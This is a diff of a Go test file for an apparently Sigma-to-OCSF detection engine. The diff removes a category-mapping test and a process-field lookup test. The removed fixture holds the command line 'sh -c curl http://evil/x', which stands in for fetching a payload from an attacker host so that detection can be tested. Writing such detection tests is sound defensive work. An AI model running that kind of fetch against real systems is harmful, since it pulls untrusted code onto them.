@@ -70,35 +70,6 @@ detection:
   condition: sel
 `
 
-func TestCategoryToClassCoversPhase1(t *testing.T) {
-	cases := map[ruleast.Category]ocsf.ClassID{
-		ruleast.CategoryProcessCreation:   ocsf.ClassProcessActivity,
-		ruleast.CategoryFileEvent:         ocsf.ClassFileSystemActivity,
-		ruleast.CategoryNetworkConnection: ocsf.ClassNetworkActivity,
-	}
-	for cat, want := range cases {
-		got, ok := categoryToClass(cat)
-		if !ok || got != want {
-			t.Errorf("categoryToClass(%q) = (%d, %v) want (%d, true)", cat, got, ok, want)
-		}
-	}
-}
-
-func TestOCSFEnvProcessLookup(t *testing.T) {
-	ev := processActivity("/bin/sh", "sh -c curl http://evil/x")
-	env := &ocsfEnv{event: ev, access: processAccessor}
-
-	for _, field := range []string{"Image", "CommandLine", "User", "ProcessId"} {
-		v, ok := env.Lookup(field)
-		if !ok || len(v) == 0 {
-			t.Errorf("Lookup(%q) miss, want hit", field)
-		}
-	}
-	if _, ok := env.Lookup("NotAField"); ok {
-		t.Errorf("Lookup of unknown field should miss")
-	}
-}
-
 func TestEngineEmitsEventAndFinding(t *testing.T) {
 	rule := compileFixture(t, curlSigma)
 	rules, err := CompileRules([]*ruleast.Rule{rule, compileFixture(t, noiseSigma)}, nil)
